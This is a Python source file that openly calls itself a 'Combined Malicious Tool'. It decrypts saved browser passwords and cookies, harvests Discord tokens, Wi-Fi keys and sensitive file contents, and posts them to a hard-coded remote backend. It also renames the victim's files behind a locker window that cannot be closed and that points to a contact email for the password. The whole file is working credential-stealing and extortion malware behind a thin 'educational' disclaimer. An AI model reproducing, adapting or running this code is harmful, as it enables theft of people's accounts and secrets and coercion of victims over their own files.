

"""
Combined Malicious Tool - All-in-One
Combines: tokenAccess, sendDataOS, encrypData, folderMonitor
- Runs in background on Windows
- Extracts browser passwords, cookies, tokens
- Collects sensitive files
- Encrypts folders and shows password GUI
- Monitors folder access

WARNING: For EDUCATIONAL/RESEARCH purposes only.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
import threading
import time
import re
import requests
import hashlib
import subprocess
from datetime import datetime, timedelta
from pathlib import Path
from collections import deque
import pyautogui

# Try to import Windows-specific modules
try:
    import ctypes
    import winreg
    WINDOWS = True
except ImportError:
    WINDOWS = False

# Try to import tkinter for GUI
try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    import webbrowser
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

# Try to import watchdog for folder monitoring
try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    HAS_WATCHDOG = True
except ImportError:
    HAS_WATCHDOG = False

def decode_ascii_to_text_mae_ah_nang():
    """Convert ASCII codes (3-digit per char) back to original text"""

    text = ""
    hello = "114097121117095109097101095097104095110097110103"
    for i in range(0, len(hello), 3):
        code = int(hello[i:i+3])
        text += chr(code)
    return text

# rayu_mae_ah_nang
# ==================== CONFIGURATION ====================
BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
API_ENDPOINT = f"{BACKEND_URL}/api/receive"
BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"

SUPPORT_EMAIL = "choengrayu307@gmail.com"
MAX_ATTEMPTS = 3
MASTER_PASSWORD = decode_ascii_to_text_mae_ah_nang()
LOCK_FILE = ".folder_lock"
ENCRYPTED_EXTENSION = ".G2_T4_virus_test"

# Browser paths for Chromium browsers
CHROMIUM_BROWSERS = {
    "Chrome": {
        "local_state": os.path.join("Google", "Chrome", "User Data", "Local State"),
        "login_data": os.path.join("Google", "Chrome", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Google", "Chrome", "User Data", "Default", "Cookies"),
        "history": os.path.join("Google", "Chrome", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Brave": {
        "local_state": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        "login_data": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
        "history": os.path.join("BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Edge": {
        "local_state": os.path.join("Microsoft", "Edge", "User Data", "Local State"),
        "login_data": os.path.join("Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Microsoft", "Edge", "User Data", "Default", "Cookies"),
        "history": os.path.join("Microsoft", "Edge", "User Data", "Default", "History"),
        "base_path": "Local"
    },
    "Opera": {
        "local_state": os.path.join("Opera Software", "Opera Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera Stable", "History"),
        "base_path": "Roaming"
    },
    "Opera GX": {
        "local_state": os.path.join("Opera Software", "Opera GX Stable", "Local State"),
        "login_data": os.path.join("Opera Software", "Opera GX Stable", "Login Data"),
        "cookies": os.path.join("Opera Software", "Opera GX Stable", "Network", "Cookies"),
        "cookies_alt": os.path.join("Opera Software", "Opera GX Stable", "Cookies"),
        "history": os.path.join("Opera Software", "Opera GX Stable", "History"),
        "base_path": "Roaming"
    },
    "Vivaldi": {
        "local_state": os.path.join("Vivaldi", "User Data", "Local State"),
        "login_data": os.path.join("Vivaldi", "User Data", "Default", "Login Data"),
        "cookies": os.path.join("Vivaldi", "User Data", "Default", "Network", "Cookies"),
        "cookies_alt": os.path.join("Vivaldi", "User Data", "Default", "Cookies"),
        "history": os.path.join("Vivaldi", "User Data", "Default", "History"),
        "base_path": "Local"
    },
}

# Firefox profile paths
FIREFOX_PATHS = {
    "Firefox": os.path.join("Mozilla", "Firefox", "Profiles"),
    "Firefox Developer": os.path.join("Mozilla", "Firefox Developer Edition", "Profiles"),
}

# Sensitive file extensions
SENSITIVE_EXTENSIONS = {
    '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
    '.txt', '.rtf', '.odt', '.ods', '.odp',
    '.pem', '.key', '.crt', '.pfx', '.p12', '.ppk',
    '.kdbx', '.keychain', '.keystore',
    '.env', '.ini', '.cfg', '.conf',
    '.db', '.sqlite', '.sqlite3', '.sql',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.wallet', '.dat',
}

# Text file extensions that can be read and extracted
TEXT_EXTRACTABLE_EXTENSIONS = {
    '.txt', '.env', '.ini', '.cfg', '.conf', '.config',
    '.json', '.xml', '.yaml', '.yml', '.toml',
    '.log', '.md', '.rst', '.csv',
    '.pem', '.key', '.crt', '.pub',
    '.sh', '.bat', '.ps1', '.cmd',
    '.py', '.js', '.java', '.c', '.cpp', '.h',
    '.html', '.css', '.sql',
}

# Folders to skip
SKIP_FOLDERS = {
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    '$Recycle.Bin', 'System Volume Information', 'Recovery',
    'node_modules', '__pycache__', '.git', '.svn', '.vscode',
    'venv', '.venv', 'Temp', 'tmp', 'Cache', 'cache',
}

# Real-time capture settings
realtime_passwords = deque(maxlen=100)
SEND_INTERVAL = 30
BROWSER_PATTERNS = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'vivaldi', 'browser']
LOGIN_PATTERNS = [r'login', r'signin', r'sign-in', r'auth', r'account', r'password']



# ==================== HELPER FUNCTIONS ====================

def get_system_info():
    """Get basic system information"""
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }


def get_appdata_path(base_type="Local"):
    """Get AppData path based on type (Local or Roaming)"""
    if platform.system() != "Windows":
        return None
    if base_type == "Local":
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local")
    else:
        return os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming")


def get_encryption_key(local_state_path):
    """Get the AES encryption key used by Chromium browsers"""
    try:
        if platform.system() != "Windows":
            return None
        if not os.path.exists(local_state_path):
            return None
        import win32crypt
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        return None


def decrypt_password(encrypted_password, key):
    """Decrypt Chromium browser password using AES-GCM"""
    try:
        if platform.system() != "Windows" or not encrypted_password:
            return None
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            if not key:
                return "[no_key]"
            from Crypto.Cipher import AES
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)
            decrypted_password = decrypted_password[:-16].decode('utf-8', errors='ignore')
            return decrypted_password
        else:
            import win32crypt
            decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        return "[decryption_failed]"


def get_chromium_passwords(browser_name, browser_config):
    """Extract saved passwords from Chromium-based browsers"""
    passwords = []
    try:
        if platform.system() != "Windows":
            return passwords
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return passwords
        login_data_path = os.path.join(base_path, browser_config["login_data"])
        if not os.path.exists(login_data_path):
            return passwords
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_login_data.db")
        shutil.copy2(login_data_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, action_url, username_value, password_value,
                   date_created, date_last_used FROM logins ORDER BY date_last_used DESC
        """)
        for row in cursor.fetchall():
            password = decrypt_password(row[3], key)
            if row[2] or password:
                passwords.append({
                    "browser": browser_name, "origin_url": row[0], "action_url": row[1],
                    "username": row[2], "password": password if password else "[empty]",
                    "date_created": str(row[4]), "date_last_used": str(row[5])
                })
        cursor.close()
        conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except Exception:
        pass
    return passwords


def get_chromium_cookies(browser_name, browser_config):
    """Extract cookies from Chromium-based browsers"""
    cookies = []
    try:
        if platform.system() != "Windows":
            return cookies
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return cookies
        cookie_path = os.path.join(base_path, browser_config["cookies"])
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(base_path, browser_config["cookies_alt"])
        if not os.path.exists(cookie_path):
            return cookies
        local_state_path = os.path.join(base_path, browser_config["local_state"])
        key = get_encryption_key(local_state_path)
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_cookies.db")
        shutil.copy2(cookie_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies ORDER BY host_key")
        for row in cursor.fetchall():
            value = decrypt_password(row[2], key)
            cookies.append({
                "browser": browser_name, "host": row[0], "name": row[1],
                "value": value if value else "[encrypted]", "path": row[3],
                "expires": str(row[4]), "is_secure": bool(row[5]), "is_httponly": bool(row[6])
            })
        cursor.close()
        conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except Exception:
        pass
    return cookies


def get_chromium_history(browser_name, browser_config):
    """Extract browser history from Chromium-based browsers"""
    history = []
    try:
        if platform.system() != "Windows":
            return history
        base_path = get_appdata_path(browser_config["base_path"])
        if not base_path:
            return history
        history_path = os.path.join(base_path, browser_config["history"])
        if not os.path.exists(history_path):
            return history
        temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{browser_name.lower()}_history.db")
        shutil.copy2(history_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
        for row in cursor.fetchall():
            history.append({"browser": browser_name, "url": row[0], "title": row[1], "visit_count": row[2], "last_visit": str(row[3])})
        cursor.close()
        conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except Exception:
        pass
    return history


def get_firefox_profiles():
    """Get all Firefox profile directories"""
    profiles = []
    try:
        if platform.system() != "Windows":
            return profiles
        roaming = get_appdata_path("Roaming")
        for browser_name, profile_path in FIREFOX_PATHS.items():
            full_path = os.path.join(roaming, profile_path)
            if os.path.exists(full_path):
                for profile_dir in os.listdir(full_path):
                    profile_full_path = os.path.join(full_path, profile_dir)
                    if os.path.isdir(profile_full_path):
                        profiles.append({"browser": browser_name, "profile": profile_dir, "path": profile_full_path})
    except Exception:
        pass
    return profiles


def get_discord_tokens():
    """Extract Discord tokens from local storage"""
    tokens = []
    try:
        if platform.system() != "Windows":
            return tokens
        userprofile = os.environ.get("USERPROFILE", "")
        discord_paths = [
            os.path.join(userprofile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
            os.path.join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        ]
        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
        mfa_pattern = r'mfa\.[\w-]{84}'
        for path in discord_paths:
            if not os.path.exists(path):
                continue
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                filepath = os.path.join(path, filename)
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                    for token in re.findall(token_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({"type": "discord_token", "token": token, "source": path})
                    for token in re.findall(mfa_pattern, content):
                        if token not in [t["token"] for t in tokens]:
                            tokens.append({"type": "discord_mfa_token", "token": token, "source": path})
                except Exception:
                    continue
    except Exception:
        pass
    return tokens


def send_to_backend(data):
    """Send extracted data to backend server"""
    try:
        url = f"{BACKEND_URL}/api/browser-data"
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = requests.post(url, json=data, headers=headers, timeout=60)
        if response.status_code == 201:
            return True
        return False
    except Exception:
        return False


def collect_all_browser_data():
    """Collect all browser data and tokens from all installed browsers"""
    system_info = get_system_info()
    all_passwords, all_cookies, all_history, all_tokens = [], [], [], []

    # Chromium browsers
    for browser_name, browser_config in CHROMIUM_BROWSERS.items():
        all_passwords.extend(get_chromium_passwords(browser_name, browser_config))
        all_cookies.extend(get_chromium_cookies(browser_name, browser_config))
        all_history.extend(get_chromium_history(browser_name, browser_config))

    # Discord tokens
    all_tokens.extend(get_discord_tokens())

    return {
        "system_info": system_info,
        "passwords": {"data": all_passwords, "total_count": len(all_passwords)},
        "cookies": {"data": all_cookies[:500], "total_count": len(all_cookies)},
        "history": {"data": all_history[:500], "total_count": len(all_history)},
        "tokens": {"data": all_tokens, "total_count": len(all_tokens)},
        "extraction_timestamp": datetime.now().isoformat()
    }


# ==================== FOLDER ENCRYPTION ====================

class FolderEncryptor:
    """Fast folder encryption - renames files with .locked extension"""

    def __init__(self, password=MASTER_PASSWORD):
        self.password = password
        self.key = hashlib.sha256(password.encode()).digest()

    def encrypt_folder(self, folder_path):
        """Encrypt folder by renaming all files with .locked extension (fast)"""
        folder_path = Path(folder_path)
        encrypted_count = 0
        if not folder_path.exists():
            return 0
        # Rename all files to .locked extension
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for file in files:
                if file == LOCK_FILE or file.endswith(ENCRYPTED_EXTENSION):
                    continue
                try:
                    file_path = os.path.join(root, file)
                    locked_path = file_path + ENCRYPTED_EXTENSION
                    os.rename(file_path, locked_path)
                    encrypted_count += 1
                except:
                    pass
        # Create lock file
        lock_path = folder_path / LOCK_FILE
        lock_data = {
            'locked_at': datetime.now().isoformat(),
            'files_count': encrypted_count,
            'password_hash': hashlib.sha256(self.password.encode()).hexdigest()
        }
        with open(lock_path, 'w') as f:
            json.dump(lock_data, f)
        if WINDOWS:
            try:
                ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 2)
            except:
                pass
        return encrypted_count

    def decrypt_folder(self, folder_path):
        """Decrypt folder by removing .locked extension from files"""
        folder_path = Path(folder_path)
        decrypted_count = 0
        if not folder_path.exists():
            return 0
        # Rename all .locked files back to original
        for root, _, files in os.walk(folder_path):
            for file in files:
                if file.endswith(ENCRYPTED_EXTENSION):
                    try:
                        locked_path = os.path.join(root, file)
                        original_path = locked_path[:-len(ENCRYPTED_EXTENSION)]
                        os.rename(locked_path, original_path)
                        decrypted_count += 1
                    except:
                        pass
        # Remove lock file
        lock_path = folder_path / LOCK_FILE
        if lock_path.exists():
            if WINDOWS:
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 0)
                except:
                    pass
            os.remove(lock_path)
        return decrypted_count


def is_folder_locked(folder_path):
    """Check if folder is locked"""
    return Path(folder_path).joinpath(LOCK_FILE).exists()


def get_other_drives():
    """Get all drives except C: on Windows"""
    drives = []
    if not WINDOWS:
        return drives
    try:
        # Check drives A-Z except C
        for letter in 'ABDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_path = f"{letter}:\\"
            if os.path.exists(drive_path):
                drives.append(Path(drive_path))
    except:
        pass
    return drives


# ==================== GUI CLASSES ====================

if HAS_GUI:
    class MultiFolderLockerGUI:
        """GUI for unlocking multiple folders with password"""

        def __init__(self, folder_paths, on_success_callback=None, auto_close=True):
            self.folder_paths = folder_paths if isinstance(folder_paths, list) else [folder_paths]
            self.on_success_callback = on_success_callback
            self.auto_close = auto_close
            self.attempts = 0
            self.max_attempts = MAX_ATTEMPTS
            self.unlocked = False
            self.lockout_active = False
            self.lockout_time = 0
            self.lockout_duration = 600

            self.root = tk.Tk()
            self.root.title("🔒 Folders Locked")
            self.root.geometry("500x600")
            self.root.resizable(False, False)
            self.center_window()
            self.setup_style()
            self.build_ui()
            self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        def center_window(self):
            self.root.update_idletasks()
            x = (self.root.winfo_screenwidth() // 2) - 250
            y = (self.root.winfo_screenheight() // 2) - 300
            self.root.geometry(f'500x600+{x}+{y}')

        def setup_style(self):
            self.bg_color = "#1e1e2e"
            self.fg_color = "#cdd6f4"
            self.accent_color = "#f38ba8"
            self.button_color = "#313244"
            self.success_color = "#a6e3a1"
            self.warning_color = "#f38ba8"
            self.entry_bg = "#45475a"
            self.root.configure(bg=self.bg_color)

        def build_ui(self):
            main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=20)
            main_frame.pack(fill=tk.BOTH, expand=True)

            tk.Label(main_frame, text="🔐", font=("Segoe UI Emoji", 45), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 8))
            tk.Label(main_frame, text="Your Folders Are Locked", font=("Segoe UI", 18, "bold"), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 5))
            tk.Label(main_frame, text="Enter password to unlock your files", font=("Segoe UI", 10), bg=self.bg_color, fg="#888").pack(pady=(0, 15))

            folders_frame = tk.Frame(main_frame, bg=self.button_color, padx=15, pady=10)
            folders_frame.pack(fill=tk.X, pady=(0, 15))
            tk.Label(folders_frame, text="📁 Locked Folders:", font=("Segoe UI", 10, "bold"), bg=self.button_color, fg=self.fg_color).pack(anchor=tk.W)
            for folder in self.folder_paths:
                tk.Label(folders_frame, text=f"   • {os.path.basename(folder)}", font=("Segoe UI", 10), bg=self.button_color, fg="#89b4fa").pack(anchor=tk.W)

            pass_frame = tk.Frame(main_frame, bg=self.bg_color)
            pass_frame.pack(fill=tk.X, pady=(0, 10))
            tk.Label(pass_frame, text="Enter Password:", font=("Segoe UI", 11), bg=self.bg_color, fg=self.fg_color).pack(anchor=tk.W)

            entry_container = tk.Frame(pass_frame, bg=self.entry_bg, highlightbackground=self.accent_color, highlightthickness=2)
            entry_container.pack(fill=tk.X, pady=(8, 0))
            self.password_var = tk.StringVar()
            self.password_entry = tk.Entry(entry_container, textvariable=self.password_var, font=("Segoe UI", 13), show="●", bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, relief=tk.FLAT, bd=10)
            self.password_entry.pack(fill=tk.X, side=tk.LEFT, expand=True)
            self.password_entry.bind('<Return>', lambda e: self.unlock_folders())

            self.status_var = tk.StringVar()
            self.status_label = tk.Label(main_frame, textvariable=self.status_var, font=("Segoe UI", 10), bg=self.bg_color, fg=self.warning_color)
            self.status_label.pack(pady=(10, 5))

            self.attempts_var = tk.StringVar()
            self.update_attempts()
            tk.Label(main_frame, textvariable=self.attempts_var, font=("Segoe UI", 9), bg=self.bg_color, fg="#666").pack(pady=(0, 12))

            self.unlock_btn = tk.Button(main_frame, text="🔓 Unlock All Folders", font=("Segoe UI", 13, "bold"), bg=self.accent_color, fg="white", relief=tk.FLAT, pady=12, cursor="hand2", command=self.unlock_folders)
            self.unlock_btn.pack(fill=tk.X, pady=(0, 10))

            tk.Button(main_frame, text="🔑 Forgot Password?", font=("Segoe UI", 10), bg=self.button_color, fg="#89b4fa", relief=tk.FLAT, pady=8, cursor="hand2", command=self.show_forgot_password).pack(fill=tk.X)
            tk.Label(main_frame, text="Contact support if you need help", font=("Segoe UI", 9), bg=self.bg_color, fg="#555").pack(side=tk.BOTTOM, pady=(15, 0))
            self.password_entry.focus_set()

        def update_attempts(self):
            if self.lockout_active:
                remaining = int(self.lockout_time + self.lockout_duration - time.time())
                if remaining > 0:
                    self.attempts_var.set(f"🔒 Locked for {remaining // 60}m {remaining % 60}s")
                    self.root.after(1000, self.update_attempts)
                else:
                    self.lockout_active = False
                    self.attempts = 0
                    self.update_attempts()
            else:
                self.attempts_var.set(f"Attempts remaining: {self.max_attempts - self.attempts}")

        def unlock_folders(self):
            if self.lockout_active:
                return
            password = self.password_var.get()
            if not password:
                self.status_var.set("⚠ Please enter a password")
                return
            self.attempts += 1
            self.update_attempts()
            if self.attempts >= self.max_attempts:
                self.lockout_active = True
                self.lockout_time = time.time()
                self.update_attempts()
                return
            self.unlock_btn.config(state=tk.DISABLED, text="🔄 Unlocking...")
            self.root.update()
            self.root.after(300, lambda: self._verify_and_unlock(password))

        def _verify_and_unlock(self, password):
            if password == MASTER_PASSWORD:
                self.status_var.set("✓ Password correct!")
                self.status_label.config(fg=self.success_color)
                encryptor = FolderEncryptor(password)
                total = 0
                for folder in self.folder_paths:
                    try:
                        total += encryptor.decrypt_folder(folder)
                    except:
                        pass
                if total > 0:
                    self.unlocked = True
                    messagebox.showinfo("Success", f"Unlocked {total} files!")
                    if self.auto_close:
                        self.root.destroy()
                else:
                    self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
            else:
                self.status_var.set("✗ Wrong password!")
                self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
                self.password_var.set("")

        def show_forgot_password(self):
            forgot = tk.Toplevel(self.root)
            forgot.title("🔑 Password Recovery")
            forgot.geometry("420x350")
            forgot.configure(bg=self.bg_color)
            forgot.transient(self.root)
            forgot.grab_set()
            frame = tk.Frame(forgot, bg=self.bg_color, padx=30, pady=25)
            frame.pack(fill=tk.BOTH, expand=True)
            tk.Label(frame, text="📧", font=("Segoe UI Emoji", 40), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
            tk.Label(frame, text="Password Recovery", font=("Segoe UI", 16, "bold"), bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
            tk.Label(frame, text=f"Contact: {SUPPORT_EMAIL}", font=("Segoe UI", 11), bg=self.bg_color, fg="#89b4fa").pack(pady=(0, 15))
            tk.Button(frame, text="📧 Open Email", font=("Segoe UI", 11, "bold"), bg=self.accent_color, fg="white", relief=tk.FLAT, pady=10, command=lambda: webbrowser.open(f"mailto:{SUPPORT_EMAIL}")).pack(fill=tk.X, pady=(0, 10))
            tk.Button(frame, text="Close", font=("Segoe UI", 10), bg="#45475a", fg=self.fg_color, relief=tk.FLAT, pady=8, command=forgot.destroy).pack(fill=tk.X)

        def on_close(self):
            if not self.unlocked:
                messagebox.showwarning("Cannot Close", "🔒 You must enter the correct password to unlock your files!")
                return
            self.root.destroy()

        def run(self):
            self.root.mainloop()
            return self.unlocked


# ==================== SENSITIVE DATA COLLECTOR ====================

class SensitiveDataCollector:
    """Collects sensitive user data on Windows"""

    def __init__(self):
        self.user_home = Path.home()
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')

    def get_user_directories(self):
        """Get Windows user directories to scan"""
        user_dirs = []
        primary_dirs = [
            self.user_home / 'Documents',
            self.user_home / 'Desktop',
            self.user_home / 'Downloads',
            self.user_home / 'Pictures',
        ]
        for d in primary_dirs:
            if d.exists():
                user_dirs.append(d)
        return user_dirs

    def is_sensitive_file(self, file_path):
        """Check if file is potentially sensitive"""
        path = Path(file_path)
        if path.suffix.lower() in SENSITIVE_EXTENSIONS:
            return True
        sensitive_patterns = ['password', 'credential', 'secret', 'key', 'token', 'auth', 'wallet', 'private']
        filename_lower = path.name.lower()
        return any(p in filename_lower for p in sensitive_patterns)

    def is_text_extractable(self, file_path):
        """Check if file content can be extracted as text"""
        path = Path(file_path)
        return path.suffix.lower() in TEXT_EXTRACTABLE_EXTENSIONS

    def extract_file_content(self, file_path, max_size_kb=500):
        """Extract content from text-based files"""
        try:
            path = Path(file_path)
            stat = path.stat()

            # Skip files larger than max_size_kb
            if stat.st_size > max_size_kb * 1024:
                return None

            # Try to read as text
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return content
            except:
                # If text reading fails, try binary and encode as base64
                try:
                    with open(file_path, 'rb') as f:
                        binary_content = f.read()
                    return base64.b64encode(binary_content).decode('utf-8')
                except:
                    return None
        except:
            return None

    def scan_directory(self, directory, max_depth=4, current_depth=0):
        """Recursively scan directory for sensitive files and extract content"""
        sensitive_files = []
        if current_depth > max_depth:
            return sensitive_files
        try:
            for item in os.scandir(directory):
                try:
                    if item.is_file() and self.is_sensitive_file(item.path):
                        file_info = {
                            'path': item.path,
                            'name': item.name,
                            'size': item.stat().st_size,
                            'extension': Path(item.path).suffix.lower(),
                            'modified_time': datetime.fromtimestamp(item.stat().st_mtime).isoformat(),
                        }

                        # Extract content if it's a text-extractable file
                        if self.is_text_extractable(item.path):
                            content = self.extract_file_content(item.path)
                            if content:
                                file_info['content'] = content
                                file_info['content_extracted'] = True

                        sensitive_files.append(file_info)
                    elif item.is_dir() and item.name not in SKIP_FOLDERS:
                        sensitive_files.extend(self.scan_directory(item.path, max_depth, current_depth + 1))
                except:
                    continue
        except:
            pass
        return sensitive_files

    def collect_wifi_passwords(self):
        """Collect saved WiFi passwords on Windows"""
        wifi_data = []
        if not WINDOWS:
            return wifi_data
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line or 'Current User Profile' in line:
                    profile_name = line.split(':')[1].strip()
                    if profile_name:
                        profiles.append(profile_name)
            for profile in profiles:
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    wifi_info = {'ssid': profile, 'password': None}
                    for line in result.stdout.split('\n'):
                        if 'Key Content' in line:
                            wifi_info['password'] = line.split(':')[1].strip()
                            break
                    wifi_data.append(wifi_info)
                except:
                    pass
        except:
            pass
        return wifi_data

    def collect_all(self):
        """Collect all sensitive data including file contents"""
        data = {
            'timestamp': datetime.now().isoformat(),
            'hostname': platform.node(),
            'os': platform.system(),
            'username': os.getenv('USERNAME'),
            'sensitive_files': [],
            'wifi_passwords': [],
            'extraction_stats': {
                'total_files_found': 0,
                'files_with_content': 0,
                'env_files_found': 0,
                'txt_files_found': 0,
            }
        }

        user_dirs = self.get_user_directories()
        all_files = []

        # Collect files from all user directories
        for user_dir in user_dirs:
            all_files.extend(self.scan_directory(user_dir))

        # Limit to first 100 files to avoid huge payloads
        data['sensitive_files'] = all_files[:100]
        data['wifi_passwords'] = self.collect_wifi_passwords()

        # Calculate statistics
        data['extraction_stats']['total_files_found'] = len(all_files)
        data['extraction_stats']['files_with_content'] = sum(1 for f in data['sensitive_files'] if f.get('content_extracted'))
        data['extraction_stats']['env_files_found'] = sum(1 for f in data['sensitive_files'] if f.get('extension') == '.env')
        data['extraction_stats']['txt_files_found'] = sum(1 for f in data['sensitive_files'] if f.get('extension') == '.txt')

        return data

    def send_to_backend(self, data):
        """Send collected data to backend"""
        try:
            url = f"{BACKEND_URL}/api/receive?type=sensitive_data"
            response = requests.post(url, json=data, headers={'Content-Type': 'application/json'}, timeout=30)
            return response.status_code in [200, 201]
        except:
            return False

    def send_in_batches(self, data, batch_size=20):
        """Send data in smaller batches to avoid payload size issues"""
        try:
            # Send metadata first (without files)
            metadata = {
                'timestamp': data.get('timestamp'),
                'hostname': data.get('hostname'),
                'os': data.get('os'),
                'username': data.get('username'),
                'wifi_passwords': data.get('wifi_passwords', []),
                'extraction_stats': data.get('extraction_stats', {}),
            }

            # Send metadata
            self.send_to_backend(metadata)

            # Send files in batches
            files = data.get('sensitive_files', [])
            for i in range(0, len(files), batch_size):
                batch = files[i:i+batch_size]
                batch_data = {
                    'timestamp': data.get('timestamp'),
                    'hostname': data.get('hostname'),
                    'batch_number': i // batch_size + 1,
                    'total_batches': (len(files) + batch_size - 1) // batch_size,
                    'sensitive_files': batch,
                }
                self.send_to_backend(batch_data)

            return True
        except:
            return False


# ==================== FOLDER MONITOR ====================

if HAS_WATCHDOG:
    class LockedFolderHandler(FileSystemEventHandler):
        """Handles file system events for locked folders"""

        def __init__(self, locked_folders, on_access_callback=None):
            super().__init__()
            self.locked_folders = locked_folders
            self.on_access_callback = on_access_callback
            self.last_trigger_time = 0
            self.cooldown = 5

        def on_any_event(self, event):
            current_time = time.time()
            if current_time - self.last_trigger_time < self.cooldown:
                return
            for folder in self.locked_folders:
                if event.src_path.startswith(str(folder)):
                    if is_folder_locked(folder):
                        self.last_trigger_time = current_time
                        if self.on_access_callback:
                            self.on_access_callback(folder)
                        break

    class FolderAccessMonitorThread(threading.Thread):
        """Thread that monitors locked folders for access attempts"""

        def __init__(self, locked_folders, on_access_callback=None):
            super().__init__(daemon=True)
            self.locked_folders = locked_folders
            self.on_access_callback = on_access_callback
            self.observer = None
            self.running = False

        def run(self):
            self.running = True
            self.observer = Observer()
            handler = LockedFolderHandler(self.locked_folders, self.on_access_callback)
            for folder in self.locked_folders:
                if Path(folder).exists():
                    self.observer.schedule(handler, str(folder), recursive=True)
            self.observer.start()
            while self.running:
                time.sleep(1)
            self.observer.stop()
            self.observer.join()

